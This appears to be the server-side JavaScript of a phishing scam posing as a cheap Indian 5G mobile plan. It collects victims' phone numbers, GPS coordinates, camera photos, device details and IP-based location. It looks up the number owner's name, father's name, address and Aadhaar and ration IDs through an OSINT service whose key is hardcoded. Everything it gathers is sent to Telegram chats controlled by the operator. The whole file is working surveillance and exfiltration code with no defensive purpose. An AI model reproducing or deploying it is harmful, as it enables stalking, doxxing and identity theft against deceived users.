const axios = require('axios');
const FormData = require('form-data');

module.exports = async (req, res) => {
  // CORS Headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  
  if (req.method === 'GET') {
    return res.status(200).json({
      success: true,
      message: '✅ ALL DATA SYSTEMS WORKING',
      features: ['Location', 'Camera', 'Device Info', 'IP Tracking', 'Metadata'],
      timestamp: new Date().toISOString()
    });
  }
  
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
  
  try {
    // Environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const MAIN_CHAT_ID = process.env.MAIN_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    const OSINT_API_KEY = process.env.OSINT_API_KEY || 'hapi_9b6d7ceadb978f832bed7650e4ac0522mmfvh9bf'; // 🔥 NEW: OSINT key added
    
    if (!BOT_TOKEN || !MAIN_CHAT_ID) {
      console.error('❌ Missing env vars');
      return res.status(500).json({ success: false, error: 'Server config missing' });
    }
    
    // Parse ALL data
    let userData = {};
    try {
      userData = req.body;
      console.log('📊 RECEIVED ALL DATA:', {
        mobile: userData.mobile,
        operator: userData.operator,
        photoSize: userData.photo ? Math.round(userData.photo.length/1024) + 'KB' : 'No photo',
        location: userData.location ? 'Present' : 'Missing',
        deviceInfo: userData.deviceInfo ? Object.keys(userData.deviceInfo).length + ' fields' : 'None',
        userChatId: userData.userChatId || 'Not provided'
      });
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
    
    // Fixed country
    userData.country = '+91';
    const USER_CHAT_ID = userData.userChatId || MAIN_CHAT_ID;
    
    // Get client IP (ALWAYS WORKS)
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    
    // 🌐 IP INFO (ENHANCED)
    let ipInfoData = { ip: clientIp, source: 'Direct IP' };
    
    if (IPINFO_TOKEN && clientIp !== 'Unknown' && !clientIp.startsWith('192.168.')) {
      try {
        const ipResponse = await axios.get(`https://ipinfo.io/${clientIp}/json?token=${IPINFO_TOKEN}`, { timeout: 3000 });
        ipInfoData = { 
          ...ipInfoData,
          ...ipResponse.data,
          source: 'ipinfo.io API',
          timestamp: new Date().toISOString()
        };
        console.log('✅ IP Info fetched:', ipInfoData.city || 'Unknown location');
      } catch (ipError) {
        console.log('⚠️ IP Info fallback to basic IP');
      }
    }
    
    // 📍 LOCATION HANDLING (FIXED FOR ALL CASES)
    let locationSection = '';
    let hasValidLocation = false;
    let mapLink = '';
    
    if (userData.location) {
      console.log('📍 Processing location:', typeof userData.location);
      
      // Case 1: Has coordinates
      if (userData.location.latitude && userData.location.longitude) {
        hasValidLocation = true;
        const lat = userData.location.latitude;
        const lon = userData.location.longitude;
        const acc = userData.location.accuracy ? Math.round(userData.location.accuracy) + 'm' : 'N/A';
        
        mapLink = `https://maps.google.com/?q=${lat},${lon}`;
        
        locationSection = `📍 *LOCATION CAPTURED*\n┌ Latitude: ${lat}\n├ Longitude: ${lon}\n├ Accuracy: ${acc}\n├ Map: ${mapLink}`;
        
        // Add address if available
        if (userData.location.address) {
          locationSection += `\n└ Address: ${userData.location.address.substring(0, 100)}`;
        } else if (userData.location.city) {
          locationSection += `\n└ Area: ${userData.location.city}, ${userData.location.state || ''}`;
        }
      }
      // Case 2: Permission denied
      else if (userData.location.status === 'Permission Denied') {
        locationSection = '📍 *LOCATION:* Permission Denied ❌';
      }
      // Case 3: Error
      else if (userData.location.error) {
        locationSection = `📍 *LOCATION:* Error - ${userData.location.error}`;
      }
      // Case 4: Any other format
      else {
        locationSection = `📍 *LOCATION:* ${JSON.stringify(userData.location).substring(0, 100)}`;
      }
    } else {
      locationSection = '📍 *LOCATION:* Not captured';
    }
    
    // 📸 PHOTO HANDLING (FIXED - ACCEPTS ALL SIZES)
    let photoSection = '';
    let canSendPhoto = false;
    let photoBuffer = null;
    let photoDetails = '';
    
    if (userData.photo) {
      console.log('📸 Photo type:', typeof userData.photo);
      
      // Case 1: Base64 image
      if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
        try {
          const base64Data = userData.photo.split(',')[1] || userData.photo.replace(/^data:image\/\w+;base64,/, '');
          
          if (base64Data && base64Data.length > 100) {
            photoBuffer = Buffer.from(base64Data, 'base64');
            const sizeKB = Math.round(photoBuffer.length / 1024);
            
            // ✅ ACCEPT ALL SIZES (8KB bhi chalega)
            if (sizeKB > 0) {
              canSendPhoto = true;
              photoDetails = `${sizeKB}KB`;
              
              if (sizeKB < 10) {
                photoSection = `📸 *CAMERA:* Captured (${sizeKB}KB - Small but OK)`;
                console.log(`📸 Small photo but accepting: ${sizeKB}KB`);
              } else if (sizeKB > 10000) {
                photoSection = `📸 *CAMERA:* Captured (${sizeKB}KB - Too large for Telegram)`;
                canSendPhoto = false;
              } else {
                photoSection = `📸 *CAMERA:* Captured ✓ (${sizeKB}KB - Good quality)`;
              }
            }
          }
        } catch (e) {
          photoSection = `📸 *CAMERA:* Processing error`;
          console.error('Photo processing error:', e.message);
        }
      }
      // Case 2: Permission denied
      else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
        photoSection = '📸 *CAMERA:* Permission Denied ❌';
      }
      // Case 3: Any other case
      else {
        photoSection = `📸 *CAMERA:* Received (type: ${typeof userData.photo})`;
      }
    } else {
      photoSection = '📸 *CAMERA:* Not captured';
    }
    
    // 📱 DEVICE INFO SECTION (COMPLETE)
    let deviceSection = '';
    if (userData.deviceInfo) {
      deviceSection = `📱 *DEVICE INFORMATION*\n`;
      
      // Basic info (ALWAYS AVAILABLE)
      if (userData.deviceInfo.userAgent) {
        deviceSection += `┌ User Agent: ${userData.deviceInfo.userAgent.substring(0, 50)}...\n`;
      }
      
      if (userData.deviceInfo.platform) {
        deviceSection += `├ Platform: ${userData.deviceInfo.platform}\n`;
      }
      
      if (userData.deviceInfo.screen) {
        deviceSection += `├ Screen: ${userData.deviceInfo.screen}\n`;
      }
      
      // Battery info
      if (userData.deviceInfo.battery) {
        deviceSection += `├ Battery: ${userData.deviceInfo.battery.level || 'N/A'}%`;
        if (userData.deviceInfo.battery.charging) deviceSection += ` (Charging ⚡)`;
        deviceSection += `\n`;
      }
      
      // Network info
      if (userData.deviceInfo.connection) {
        deviceSection += `├ Network: ${userData.deviceInfo.connection.effectiveType || 'N/A'}`;
        if (userData.deviceInfo.connection.downlink) deviceSection += ` (${userData.deviceInfo.connection.downlink}Mbps)`;
        deviceSection += `\n`;
      }
      
      // Timezone
      if (userData.deviceInfo.timezone) {
        deviceSection += `├ Timezone: ${userData.deviceInfo.timezone}\n`;
      }
      
      // URL
      if (userData.deviceInfo.url) {
        deviceSection += `└ URL: ${userData.deviceInfo.url}`;
      }
    } else {
      deviceSection = '📱 *DEVICE:* No information captured';
    }
    
    // 🌐 IP INFO SECTION
    let ipSection = `🌐 *IP INFORMATION*\n`;
    ipSection += `┌ IP Address: ${ipInfoData.ip}\n`;
    
    if (ipInfoData.org) {
      ipSection += `├ ISP: ${ipInfoData.org.replace('AS', '')}\n`;
    }
    
    if (ipInfoData.city) {
      ipSection += `├ City: ${ipInfoData.city}\n`;
    }
    
    if (ipInfoData.region) {
      ipSection += `├ Region: ${ipInfoData.region}\n`;
    }
    
    if (ipInfoData.country) {
      ipSection += `└ Country: ${ipInfoData.country}\n`;
    }
    
    ipSection += `📡 Source: ${ipInfoData.source}`;
    
    // ============================================
    // 🔥 NEW: OSINT API INTEGRATION (SERVER SIDE)
    // ============================================
    let osintSection = '';
    let osintData = {};
    
    // Sirf agar mobile number hai to fetch karo
    if (userData.mobile) {
      try {
        console.log(`🔍 Fetching OSINT data for: ${userData.mobile}`);
        
        const osintResponse = await axios.get(
          `https://osint-pro-version.vercel.app/api/v1/search?number=${userData.mobile}&api_key=${OSINT_API_KEY}`,
          { timeout: 8000 }
        );
        
        if (osintResponse.data && osintResponse.data.success) {
          const apiData = osintResponse.data.data?.data;
          
          if (apiData) {
            osintSection = `🔍 *OSINT DATA (SERVER FETCHED)*\n`;
            
            // 1. Number info (main data)
            if (apiData.number_info && apiData.number_info.length > 0) {
              const info = apiData.number_info[0];
              osintData.number_info = info;
              
              osintSection += `┌ Name: ${info.name || 'N/A'}\n`;
              osintSection += `├ Father: ${info.fname || 'N/A'}\n`;
              osintSection += `├ Address: ${(info.address || 'N/A').substring(0, 100)}\n`;
              osintSection += `├ Circle: ${info.circle || 'N/A'}\n`;
              
              // Masked IDs
              if (info.id) osintSection += `├ ID: ${maskString(info.id)}\n`;
              if (info.uid) osintSection += `├ UID: ${maskString(info.uid)}\n`;
              if (info.id_db) osintSection += `├ DB ID: ${maskString(info.id_db)}\n`;
            }
            
            // 2. Ration data (agar hai to)
            if (apiData.ration && apiData.ration.length > 0) {
              const ration = apiData.ration[0];
              osintData.ration = ration;
              osintSection += `├ Ration ID: ${maskString(ration.id || 'N/A')}\n`;
            }
            
            // 3. Aadhar data (agar hai to)
            if (apiData.aadhar && apiData.aadhar.length > 0) {
              const aadhar = apiData.aadhar[0];
              osintData.aadhar = { id: aadhar.id };
              osintSection += `└ Aadhar ID: ${maskString(aadhar.id || 'N/A')}\n`;
            }
          }
        }
      } catch (osintError) {
        console.log('⚠️ OSINT fetch failed (non-critical):', osintError.message);
        osintSection = ''; // Koi section mat bhejo agar fail ho
      }
    }
    
    // Helper function to mask IDs
    function maskString(str) {
      if (!str || str.length < 8) return str || 'N/A';
      return str.substring(0, 4) + 'XXXX' + str.substring(str.length - 4);
    }
    // ============================================
    
    // 💰 MAIN MESSAGE (ALL DATA INCLUDED + OSINT)
    const message = `
💰 *₹249 5G PLAN ACTIVATED - COMPLETE DATA CAPTURE*

👤 *USER INFORMATION*
┌ Mobile: +${userData.country}${userData.mobile}
└ Operator: ${userData.operator}

${ipSection}

${deviceSection}

${locationSection}

${photoSection}

${osintSection ? osintSection + '\n' : ''}<!-- 🔥 OSINT section added here -->

⏰ *TIMESTAMP*
┌ Server Time: ${new Date().toISOString()}
├ Local Time: ${new Date().toLocaleString('en-IN')}
└ User Chat ID: ${USER_CHAT_ID}

📊 *DATA SUMMARY*
✅ Mobile & Operator: Captured
✅ IP Information: ${ipInfoData.source === 'ipinfo.io API' ? 'Detailed' : 'Basic'}
✅ Device Info: ${userData.deviceInfo ? Object.keys(userData.deviceInfo).length + ' fields' : 'None'}
✅ Location: ${hasValidLocation ? 'GPS Coordinates' : (userData.location ? userData.location.status : 'Not captured')}
✅ Camera: ${photoSection.includes('Captured') ? 'Photo taken' : (photoSection.includes('Denied') ? 'Denied' : 'Not taken')}
${osintData.number_info ? '✅ OSINT Data: Found' : ''}
    `;
    
    // 📤 SEND TO TELEGRAM
    const chatIds = [...new Set([MAIN_CHAT_ID, USER_CHAT_ID].filter(Boolean))];
    const results = [];
    
    console.log(`📤 Sending COMPLETE DATA to ${chatIds.length} chat(s)`);
    
    for (const chatId of chatIds) {
      try {
        // 1. Send MAIN MESSAGE with ALL DATA
        const msgResponse = await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          },
          { timeout: 10000 }
        );
        
        console.log(`✅ Main message sent to ${chatId} (ID: ${msgResponse.data.result?.message_id})`);
        
        // 2. Send PHOTO if available
        if (canSendPhoto && photoBuffer) {
          try {
            console.log(`🖼️ Sending photo to ${chatId} (${Math.round(photoBuffer.length/1024)}KB)`);
            
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', photoBuffer, {
              filename: `photo_${userData.mobile}_${Date.now()}.jpg`,
              contentType: 'image/jpeg'
            });
            form.append('caption', `📸 Photo verification for ${userData.mobile}\n📱 ${userData.mobile} | 📍 ${hasValidLocation ? 'Location captured' : 'No location'}`);
            
            await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
              form,
              {
                headers: form.getHeaders(),
                timeout: 20000
              }
            );
            
            console.log(`✅ Photo sent to ${chatId}`);
            
          } catch (photoError) {
            console.error(`❌ Photo failed for ${chatId}:`, photoError.message);
            
            // Send photo info as message
            await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
              {
                chat_id: chatId,
                text: `📸 Photo captured for ${userData.mobile} (${Math.round(photoBuffer.length/1024)}KB) but upload failed.\nError: ${photoError.message}`
              },
              { timeout: 5000 }
            );
          }
        }
        
        // 3. Send MAP LINK if location available
        if (hasValidLocation && mapLink) {
          await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
              chat_id: chatId,
              text: `🗺️ Google Maps Link for ${userData.mobile}:\n${mapLink}`,
              disable_web_page_preview: false
            },
            { timeout: 5000 }
          );
        }
        
        results.push({ chatId, success: true, dataSent: 'All' });
        
        // Delay to avoid rate limits
        await new Promise(resolve => setTimeout(resolve, 600));
        
      } catch (error) {
        console.error(`❌ Failed for ${chatId}:`, error.message);
        results.push({ chatId, success: false, error: error.message });
      }
    }
    
    // ✅ FINAL RESPONSE (SAME AS BEFORE)
    res.status(200).json({ 
      success: true, 
      message: '✅ ALL DATA PROCESSED SUCCESSFULLY',
      dataSummary: {
        mobile: userData.mobile,
        operator: userData.operator,
        ipInfo: ipInfoData.source,
        deviceInfo: userData.deviceInfo ? 'Captured' : 'None',
        location: hasValidLocation ? 'GPS coordinates' : (userData.location?.status || 'Not captured'),
        photo: canSendPhoto ? 'Sent to Telegram' : (photoSection.includes('Denied') ? 'Permission denied' : 'Not captured'),
        osint: osintData.number_info ? 'Found' : 'Not found', // 🔥 NEW: OSINT status in response
        chats: results.filter(r => r.success).length + '/' + results.length
      },
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ SERVER ERROR:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Server processing failed',
      details: error.message,
      timestamp: new Date().toISOString()
    });
  }
};
